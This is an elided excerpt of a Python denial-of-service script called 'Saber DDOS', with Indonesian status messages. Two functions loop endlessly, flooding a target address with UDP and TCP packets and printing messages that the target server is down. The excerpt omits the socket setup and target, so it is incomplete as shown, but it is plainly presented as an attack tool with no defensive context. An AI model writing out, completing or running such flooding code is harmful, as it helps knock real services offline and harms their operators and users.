	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Mengirim Packet Menggunakan Saber DDOS")
		except:
			print("[>] Server Tidak Terhubung Ke Jaringan Down!!!")
...
def run2():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(data)
			print(i +" Mengirim Packet Mengggunakn Saber DDOS")
		except:
			s.close()
			print("[>] Server Tidak Terhubung Ke Jaringan Down!!!")
